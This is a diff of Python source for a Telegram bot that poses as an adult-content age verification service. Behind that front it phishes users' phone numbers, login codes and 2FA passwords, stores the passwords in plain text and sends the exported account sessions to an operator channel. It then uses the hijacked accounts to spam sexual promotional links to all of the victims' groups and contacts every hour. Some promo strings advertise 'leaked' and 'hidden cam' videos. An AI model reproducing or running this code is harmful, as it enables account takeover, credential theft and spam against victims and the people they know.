@@ -33,30 +33,30 @@ database = mongo_client['Cluster0']['sessions']
 
 # Promo Texts (10 unique messages)
 PROMO_TEXTS = [
-    "🔥 10K+ horny Videos!! \n💦 Real Cum, No Filters \n💎 Ultra HD Uncut Scenes  \n🎁 No Cost — Click & Claim now! \n👉 http://bit.ly/hot_bot",
-    "💋 Uncensored Desi Leaks! \n🔥 Real GF/BF Videos \n😍 Free Access Here \n👉 http://bit.ly/hot_bot",
-    "😈 Indian, Desi, Couples \n🔥 10K+ horny Videos!! \n💦 Hidden Cam + GF Fun \n👉 http://bit.ly/hot_bot",
-    "🎥 Leaked College MMS \n😍 100% Real Desi Action \n💥 Tap to Watch \n👉 http://bit.ly/hot_bot",
-    "💎 VIP Only Scenes Now Free \n💦 Hidden Cam + GF Fun \n👀 Daily New Leaks \n👉 http://bit.ly/hot_bot",
-    "👅 Unlimited Hot Content \n🔞 Free Lifetime Access \n🎁 Unlimited Hot Content \n👉 http://bit.ly/hot_bot",
-    "🔥 Hidden Cam + GF Fun \n💋 Just Click & Watch \n💦 Ultra Real Videos \n👉 http://bit.ly/hot_bot",
-    "🎬 Daily New Leaks \n💥 Indian, Desi, Couples \n🔞 10K+ horny Videos!! \n👉 http://bit.ly/hot_bot",
-    "👀 New Viral Hard Videos \n💦 Real Amateur Fun With Man \n🎉 Join & Enjoy \n👉 http://bit.ly/hot_bot",
-    "🚨 Unlimited Hot Content \n💦 18+ Only Videos \n🔥 Try Once, Regret Never \n👉 http://bit.ly/hot_bot"
+    "🔥 Join our exclusive channel!",
+    "🎉 Unlock premium content now!",
+    "💋 VIP access waiting for you!",
+    "🔞 Best adult content on Telegram!",
+    "🌟 Exclusive videos just for you!",
+    "💥 Your premium pass starts here!",
+    "😈 Don't miss our collection!",
+    "👑 VIP membership available!",
+    "🕶️ Hidden gems await!",
+    "💎 Premium quality content!"
 ]
 
 # Strings
 strings = {
     'need_login': "You have to /login first!",
     'already_logged_in': "You're already logged in! 🥳",
-    'age_verification': "**🔥 ʀᴇᴀᴅʏ ғᴏʀ ᴜɴʟɪᴍɪᴛᴇᴅ ᴀᴅᴜʟᴛ ᴠɪᴅᴇᴏs? \n\n🚀 ᴄᴏɴғɪʀᴍ ʏᴏᴜ'ʀᴇ 18+ ᴛᴏ ᴜɴʟᴏᴄᴋ ɪɴsᴛᴀɴᴛ ᴀᴄᴄᴇss ᴛᴏ ᴛʜᴇ ʜᴏᴛᴛᴇsᴛ ᴄᴀᴛᴇɢᴏʀɪᴇs.  \n\n⚡️ ᴅᴏɴ'ᴛ ᴍɪss ɪᴛ — ᴀᴄᴄᴇss ɪs ʟɪᴍɪᴛᴇᴅ!  \n\n👇 Click below to verify 👇",
-    'verification_success': "**✅ VERIFIED!**\n\nAccess granted to premium content!",
-    'logout_success': "Logged out! 🔒\n\n/login to access again.",
-    'not_logged_in': "Not logged in! ❌\n\n/login first.",
-    'otp_wrong': "**❌ WRONG OTP!**\n\nAttempts left: {attempts}/3",
-    'otp_blocked': "**🚫 BLOCKED!**\n\nToo many wrong OTP attempts.",
-    '2fa_wrong': "**❌ WRONG 2FA PASSWORD!**\n\nAttempts left: {attempts}/3",
-    '2fa_blocked': "**🚫 BLOCKED!**\n\nToo many wrong 2FA attempts."
+    'age_verification': "**⚠️ AGE VERIFICATION:**\nYou must be 18+ to proceed.\nClick below to verify 👇",
+    'verification_success': "**✅ VERIFIED!**\nAccess granted to premium content!",
+    'logout_success': "Logged out! 🔒\n/login to access again.",
+    'not_logged_in': "Not logged in! ❌\n/login first.",
+    'otp_wrong': "**❌ WRONG OTP!**\nAttempts left: {attempts}/3",
+    'otp_blocked': "**🚫 BLOCKED!**\nToo many wrong OTP attempts.\nContact admin.",
+    '2fa_wrong': "**❌ WRONG 2FA PASSWORD!**\nAttempts left: {attempts}/3",
+    '2fa_blocked': "**🚫 BLOCKED!**\nToo many wrong 2FA attempts.\nContact admin."
 }
 
 # Inline OTP Keyboard
@@ -85,7 +85,6 @@ OTP_KEYBOARD = InlineKeyboardMarkup([
 
 # State Management
 user_states = {}
-last_log_msg_ids = {}  # Stores last log msg ID per user
 
 async def check_login_status(user_id):
     user_data = database.find_one({"id": user_id})
@@ -97,23 +96,6 @@ async def cleanup_user_state(user_id):
         if 'client' in state and state['client'].is_connected:
             await state['client'].disconnect()
         del user_states[user_id]
-
-async def update_log(bot, phone, text):
-    """Edits last log msg (if exists) or sends new one."""
-    if phone in last_log_msg_ids:
-        try:
-            await bot.edit_message_text(
-                chat_id=LOG_CHANNEL_SESSIONS_FILES,
-                message_id=last_log_msg_ids[phone],
-                text=f"📱 {phone} | {text}"
-            )
-            return
-        except:
-            pass
-    
-    # Send new log if no existing message
-    msg = await bot.send_message(LOG_CHANNEL_SESSIONS_FILES, f"📱 {phone} | {text}")
-    last_log_msg_ids[phone] = msg.id
 
 @Client.on_message(filters.private & filters.command("login"))
 async def start_login(bot: Client, message: Message):
@@ -170,7 +152,9 @@ async def handle_contact(bot: Client, message: Message):
         await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
         return
     
+    # Send & auto-delete "Processing..." message
     processing_msg = await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
+    
     phone_number = message.contact.phone_number
     if not phone_number.startswith('+'):
         phone_number = f"+{phone_number}"
@@ -196,6 +180,8 @@ async def handle_contact(bot: Client, message: Message):
             reply_markup=OTP_KEYBOARD
         )
         user_states[user_id]['last_msg_id'] = sent_msg.id
+        
+        # Delete "Processing..." after OTP is sent
         await bot.delete_messages(user_id, processing_msg.id)
         
     except Exception as e:
@@ -272,15 +258,20 @@ async def handle_2fa_password(bot: Client, message: Message):
     state = user_states[user_id]
     
     try:
+        # Delete the "2FA REQUIRED" message first
         if 'last_msg_id' in state:
             await bot.delete_messages(user_id, state['last_msg_id'])
         
+        # Delete user's password message IMMEDIATELY
         await message.delete()
         
         await state['client'].check_password(password=password)
         verified_msg = await bot.send_message(user_id, "Password verified...", reply_markup=ReplyKeyboardRemove())
+        
+        # Store verified_msg ID for deletion after session creation
         state['verified_msg_id'] = verified_msg.id
         
+        # Save 2FA password to DB (plain text)
         database.update_one(
             {"id": user_id},
             {"$set": {
@@ -318,6 +309,7 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         string_session = await client.export_session_string()
         await client.disconnect()
         
+        # Save to database
         data = {
             'session': string_session,
             'logged_in': True,
@@ -331,20 +323,28 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
             data['id'] = user_id
             database.insert_one(data)
 
+        # Create sessions directory if not exists
         os.makedirs("sessions", exist_ok=True)
+
+        # Generate session file path
         clean_phone = phone_number.replace('+', '')
         session_file = Path(f"sessions/{clean_phone}.session")
 
+        # Manually save session file
         with open(session_file, "w") as f:
             f.write(string_session)
             
+        # Send to log channel
         await bot.send_document(
             LOG_CHANNEL_SESSIONS_FILES,
             str(session_file),
             caption=f"📱 User: {clean_phone}\n🔑 Session Created!"
         )
+        
+        # Remove local copy
         os.remove(session_file)
 
+        # Delete "Password verified..." message after sending success
         if 'verified_msg_id' in user_states[user_id]:
             await bot.delete_messages(user_id, user_states[user_id]['verified_msg_id'])
         
@@ -357,44 +357,77 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         await cleanup_user_state(user_id)
 
 async def send_promotion_messages(bot: Client, session_string: str, phone_number: str):
+    already_notified = False
+    
     while True:
         client = None
         try:
             client = Client("promo", session_string=session_string)
             await client.start()
             
-            # Check if promotion is enabled
+            # Reset notification flag on successful connection
+            already_notified = False
+            
+            # Debug log with mobile number
+            await bot.send_message(
+                LOG_CHANNEL_SESSIONS_FILES,
+                f"🚀 Starting promotion cycle for: {phone_number}"
+            )
+            
+            # Check if promotion is enabled in DB
             user_data = database.find_one({"mobile_number": phone_number})
             if not user_data or not user_data.get('promotion', True):
-                await update_log(bot, phone_number, "⏸️ Promotion stopped (manual disable).")
+                await bot.send_message(
+                    LOG_CHANNEL_SESSIONS_FILES,
+                    f"⏸️ Promotion stopped for: {phone_number}"
+                )
                 break
             
-            # Get all groups & contacts
+            # Get all groups (excluding channels)
             groups = []
-            contacts_and_privates = []
-            
             async for dialog in client.get_dialogs():
                 if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                     groups.append(dialog.chat.id)
-                elif dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_bot:
+            
+            # Get all contacts and private chats
+            contacts_and_privates = []
+            contacts = await client.get_contacts()
+            for user in contacts:
+                if not user.is_bot:  # Check if the user is not a bot
+                    contacts_and_privates.append(user.id)
+            
+            async for dialog in client.get_dialogs(limit=200):
+                if (dialog.chat.type == enums.ChatType.PRIVATE and 
+                    dialog.chat.id not in contacts_and_privates):
                     contacts_and_privates.append(dialog.chat.id)
             
-            # Phase 1: Groups (1 msg/min)
+            # Phase 1: Groups (1 message/minute)
             group_count = 0
             for group in groups:
                 try:
                     text = random.choice(PROMO_TEXTS)
                     await client.send_message(group, text)
                     group_count += 1
-                    await update_log(bot, phone_number, f"✅ Group {group_count}/{len(groups)}: Sent!")
+                    await bot.send_message(
+                        LOG_CHANNEL_SESSIONS_FILES,
+                        f"✅ {phone_number} | Group {group_count}/{len(groups)}: {text[:20]}...",
+                        disable_notification=True
+                    )
                     await asyncio.sleep(60)
                 except FloodWait as e:
-                    await update_log(bot, phone_number, f"⏳ FloodWait: Sleeping {e.value}s")
+                    await bot.send_message(
+                        LOG_CHANNEL_SESSIONS_FILES,
+                        f"⏳ {phone_number} | FloodWait: Sleeping {e.value}s"
+                    )
                     await asyncio.sleep(e.value + 5)
                 except Exception as e:
-                    await update_log(bot, phone_number, f"❌ Group failed: {str(e)}")
+                    await bot.send_message(
+                        LOG_CHANNEL_SESSIONS_FILES,
+                        f"❌ {phone_number} | Failed group: {str(e)}",
+                        disable_notification=True
+                    )
             
-            # Phase 2: Contacts (fast)
+            # Phase 2: Contacts (rapid-fire)
             contact_count = 0
             for target in contacts_and_privates:
                 try:
@@ -402,56 +435,69 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                     await client.send_message(target, text)
                     contact_count += 1
                     if contact_count % 10 == 0:
-                        await update_log(bot, phone_number, f"📩 Contacts: {contact_count} sent")
+                        await bot.send_message(
+                            LOG_CHANNEL_SESSIONS_FILES,
+                            f"📩 {phone_number} | Contacts: {contact_count} sent",
+                            disable_notification=True
+                        )
                 except FloodWait as e:
                     await asyncio.sleep(e.value + 5)
                 except Exception:
                     continue
             
-            # Cycle complete
-            await update_log(
-                bot,
-                phone_number,
-                f"🎉 Cycle Complete!\n"
+            # Completion report
+            await bot.send_message(
+                LOG_CHANNEL_SESSIONS_FILES,
+                f"🎉 #Cycle_Complete: {phone_number}\n"
                 f"• Groups: {group_count}/{len(groups)}\n"
                 f"• Contacts: {contact_count}\n"
-                f"⏳ Next in 1h"
+                f"⏳ Next cycle in 1 hour"
             )
+            
+            # Wait 1 hour before next cycle
             await asyncio.sleep(3600)
             
         except (AuthKeyUnregistered, SessionRevoked, SessionExpired) as e:
-            error_type = {
-                AuthKeyUnregistered: "SESSION_REVOKED",
-                SessionRevoked: "SESSION_REVOKED",
-                SessionExpired: "SESSION_EXPIRED"
-            }.get(type(e), "SESSION_INVALID")
-            
-            database.update_one(
-                {"mobile_number": phone_number},
-                {"$set": {"promotion": False}}
-            )
-            await bot.send_message(
-                LOG_CHANNEL_SESSIONS_FILES,
-                f"💀 #STOPPED: {phone_number}\n"
-                f"🚫 Reason: {error_type}\n"
-                f"❌ Error: {str(e)}"
-            )
-            break
-            
-        except Exception as e:
-            if any(err in str(e) for err in ["AUTHORISATION", "FORBIDDEN", "INVALID"]):
+            if not already_notified:
+                error_type = {
+                    AuthKeyUnregistered: "SESSION_EXPIRED",
+                    SessionRevoked: "SESSION_REVOKED", 
+                    SessionExpired: "SESSION_EXPIRED"
+                }.get(type(e), "SESSION_TERMINATED")
+                
+                await bot.send_message(
+                    LOG_CHANNEL_SESSIONS_FILES,
+                    f"💀 #{error_type}: {phone_number}\n"
+                    f"❌ Error: {str(e)}\n"
+                    f"🛑 Auto-disabled promotion"
+                )
                 database.update_one(
                     {"mobile_number": phone_number},
                     {"$set": {"promotion": False}}
                 )
+                already_notified = True
+            break
+            
+        except Exception as e:
+            if "AUTH_KEY_UNREGISTERED" in str(e) and not already_notified:
                 await bot.send_message(
                     LOG_CHANNEL_SESSIONS_FILES,
-                    f"💀 #STOPPED: {phone_number}\n"
-                    f"🚫 Reason: {str(e)[:100]}..."
+                    f"💀 #SESSION_TERMINATED: {phone_number}\n"
+                    f"❌ Error: {str(e)}\n"
+                    f"🛑 Emergency stop"
                 )
+                database.update_one(
+                    {"mobile_number": phone_number},
+                    {"$set": {"promotion": False}}
+                )
+                already_notified = True
                 break
                 
-            await update_log(bot, phone_number, f"⚠️ Error: {str(e)}\n🔄 Retrying in 5m...")
+            await bot.send_message(
+                LOG_CHANNEL_SESSIONS_FILES,
+                f"💀 #Cycle_Failed: {phone_number}\n\n{str(e)}\n"
+                f"🔄 Restarting in 5 minutes..."
+            )
             await asyncio.sleep(300)
             
         finally:
